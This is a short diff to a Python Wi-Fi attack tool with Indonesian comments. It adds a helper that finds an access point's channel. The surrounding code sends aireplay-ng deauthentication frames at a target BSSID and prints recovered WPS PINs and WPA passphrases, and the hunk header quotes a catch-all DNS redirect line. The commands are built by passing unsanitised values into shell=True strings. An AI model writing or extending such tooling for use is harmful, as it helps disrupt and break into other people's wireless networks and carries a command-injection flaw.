@@ -711,11 +711,25 @@ address=/#/192.168.1.1
         cmd = f"aireplay-ng -0 1 -a {bssid} {self.interface}"
         try:
             subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-            time.sleep(2)  # tunggu AP mereset
+            time.sleep(2)
             return True
         except subprocess.CalledProcessError:
             print("[!] Gagal mengirim deauth.")
             return False
+
+    def _get_channel(self, bssid):
+        """Cari channel AP dari scan iw"""
+        try:
+            cmd = f"iw dev {self.interface} scan | grep -A 10 'BSS {bssid}' | grep 'channel' | head -1"
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                channel = re.search(r'channel (\d+)', result.stdout)
+                if channel:
+                    return int(channel.group(1))
+        except Exception:
+            pass
+        # Fallback: channel 1 jika tidak ditemukan
+        return 1
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
         print(f"[+] WPS PIN: '{wps_pin}'")
